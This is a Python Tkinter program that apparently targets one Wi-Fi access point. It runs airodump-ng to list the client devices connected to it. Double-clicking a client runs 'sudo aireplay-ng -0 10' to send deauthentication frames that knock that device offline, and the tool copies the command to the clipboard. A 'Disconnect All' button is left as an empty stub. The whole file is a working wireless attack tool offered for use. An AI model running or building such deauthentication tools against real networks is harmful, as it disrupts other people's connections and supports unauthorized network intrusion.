import os
import time
import csv
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, messagebox
import sys

# --------- SETTINGS ----------
INTERFACE = "wlp0s20f3"
MON_INTERFACE = INTERFACE + "mon"

CAPTURE_PREFIX = "network_scan_devices"       
CAPTURE_CSV = f"{CAPTURE_PREFIX}-01.csv"

REFRESH_MS = 1500                # table refresh interval

RECOVERY_SCRIPT = "recovery.py"  # your file in same folder

essid = sys.argv[1]
bssid = sys.argv[2]
ch = sys.argv[3]
file_name = sys.argv[4]
mon_interface = sys.argv[5]
# -----------------------------


def run_quiet(cmd: list[str]) -> int:
    """Run command without spamming UI; return exit code."""
    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return r.returncode
    except Exception:
        return 1


def parse_airodump_csv(path: str):
    """
    Parse only the Station MAC section from airodump CSV.
    Returns list of client devices.
    """
    if not os.path.exists(path):
        return []

    devices = []

    try:
        with open(path, newline="", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)

            header = None
            index = {}
            in_station_section = False

            for row in reader:
                if not row:
                    continue

                first = row[0].strip()

                # Detect station header
                if first == "Station MAC":
                    header = [c.strip() for c in row]
                    index = {name: i for i, name in enumerate(header)}
                    in_station_section = True
                    continue

                if not in_station_section:
                    continue

                # Skip malformed rows
                if header and len(row) < len(header):
                    continue

                def get(col, default=""):
                    i = index.get(col)
                    if i is None or i >= len(row):
                        return default
                    return row[i].strip()

                station_mac = get("Station MAC")
                bssid = get("BSSID")
                packets = get("# packets")
                pwr = get("Power")
                probed = get("Probed ESSIDs")

                # Basic sanity
                if len(station_mac.split(":")) != 6:
                    continue

                devices.append({
                    "Station MAC": station_mac,
                    "BSSID": bssid,
                    "Packets": packets,
                    "PWR": pwr,
                    "Probed ESSIDs": probed,
                })

    except Exception:
        print("Error reading CSV:", sys.exc_info()[0])
        return []

    # Optional sort by packets
    def pkt_key(s):
        try:
            return int(s.get("Packets", 0))
        except Exception:
            return 0

    devices.sort(key=pkt_key, reverse=True)
    return devices

class WifiNetworksUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Devices on " + essid)
        self.geometry("1100x650")

        self.proc = None
        self.worker = None
        self.scanning = False

        # Top controls
        top = ttk.Frame(self)
        top.pack(fill="x", padx=10, pady=10)

        self.status_var = tk.StringVar(value="Ready.")
        ttk.Label(top, textvariable=self.status_var).pack(side="left")

        self.start_btn = ttk.Button(top, text="Start Scan", command=self.start_scan)
        self.start_btn.pack(side="right")

        self.stop_btn = ttk.Button(top, text="Stop", command=self.stop_scan, state="disabled")
        self.stop_btn.pack(side="right", padx=8)

        self.disconnect_btn = ttk.Button(top, text="Disconnect All", command=self.disconnectAll_btn)
        self.disconnect_btn.pack(side="right", padx=16)

        # Table
        columns = ("Station MAC", "BSSID", "Packets", "PWR", "Probed ESSIDs")
        self.tree = ttk.Treeview(self, columns=columns, show="headings", height=22)
        self.tree.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        for col in columns:
            self.tree.heading(col, text=col)
            # column widths
            if col == "ESSID":
                self.tree.column(col, width=260, anchor="w")
            elif col == "BSSID":
                self.tree.column(col, width=170, anchor="w")
            elif col in ("Privacy", "Cipher", "Auth"):
                self.tree.column(col, width=110, anchor="w")
            elif col == "Band":
                self.tree.column(col, width=70, anchor="center")
            else:
                self.tree.column(col, width=80, anchor="center")

        self.tree.bind("<Double-1>", self.on_double_click)

        # Bottom help
        note = (
            "Tip: Run this UI with sudo so it doesn't block on password prompts:\n"
            "  sudo python3 wifi_networks_table_ui.py\n"
            "The table updates from network_scan-01.csv while airodump runs."
        )
        ttk.Label(self, text=note, foreground="gray").pack(fill="x", padx=10, pady=(0, 10))

        self.after(REFRESH_MS, self.refresh_table)

    def disconnectAll_btn (self, _event=None):
        pass

    def on_double_click(self, _event=None):
        sel = self.tree.selection()
        if not sel:
            return

        values = self.tree.item(sel[0], "values")
        if len(values) < 2:
            return

        bssid = values[1]
        stationMAC = values[0]
        subprocess.run(["sudo", "aireplay-ng", "-0", "10", "-a", bssid, "-c", stationMAC, MON_INTERFACE])
        cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} -c {stationMAC} {MON_INTERFACE}"
        self.clipboard_clear()
        self.clipboard_append(cmd)
        self.set_status("Copied command to clipboard (paste in terminal).")

    def set_status(self, msg: str):
        self.status_var.set(msg)

    def clear_table(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

    def start_scan(self):
        print("start_scan started")
        if self.worker and self.worker.is_alive():
            messagebox.showinfo("Running", "Scan is already running.")
            return

        self.clear_table()
        self.set_status("Starting monitor mode + capture...")
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.scanning = True

        self.worker = threading.Thread(target=self._scan_worker, daemon=True)
        self.worker.start()

    def _scan_worker(self):
        print("_scan_worker started")
        try:
            # Clean old captures (optional)
            for suffix in ("-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.cap"):
                p = CAPTURE_PREFIX + suffix
                if os.path.exists(p):
                    try:
                        os.remove(p)
                    except Exception:
                        pass

            # 3) Start airodump writing CSV
            self.after(0, self.set_status, "airodump-ng running (writing CSV)...")
            self.proc = subprocess.Popen(
                    ["sudo", "airodump-ng", "--bssid", bssid, "-c", ch, "-w", CAPTURE_PREFIX,"--output-format", "csv", MON_INTERFACE],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Keep thread alive while scanning
            while self.scanning and self.proc and self.proc.poll() is None:
                time.sleep(0.3)

        except Exception as e:
            self.after(0, messagebox.showerror, "Error", str(e))
        finally:
            self.after(0, self._scan_finished_ui)

    def _scan_finished_ui(self):
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        if self.scanning:
            self.set_status("Stopped.")
        else:
            self.set_status("Ready.")
        self.scanning = False

    def stop_scan(self):
        self.scanning = False
        self.set_status("Stopping...")
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
            except Exception:
                pass
        self.proc = None

    def refresh_table(self):
        # Update table periodically while scanning
        if self.scanning:
            nets = parse_airodump_csv(CAPTURE_CSV)

            # Preserve selection BSSID if user clicked a row
            selected = None
            sel = self.tree.selection()
            if sel:
                selected_vals = self.tree.item(sel[0], "values")
                if len(selected_vals) >= 7:
                    selected = selected_vals[0]  # BSSID column

            self.clear_table()

            best_count = 0
            for n in nets:
                values = (
                    n["Station MAC"],
                    n["BSSID"],
                    n["Packets"],
                    n["PWR"],
                    n["Probed ESSIDs"]
                )
                iid = self.tree.insert("", "end", values=values)
                if selected and n["BSSID"] == selected:
                    self.tree.selection_set(iid)

                best_count += 1
                if best_count >= 200:  # avoid huge UI lag
                    break

            self.set_status(f"Scanning... Networks found: {len(nets)} (showing up to 200)")

        self.after(REFRESH_MS, self.refresh_table)

if __name__ == "__main__":
    app = WifiNetworksUI()
    app.mainloop()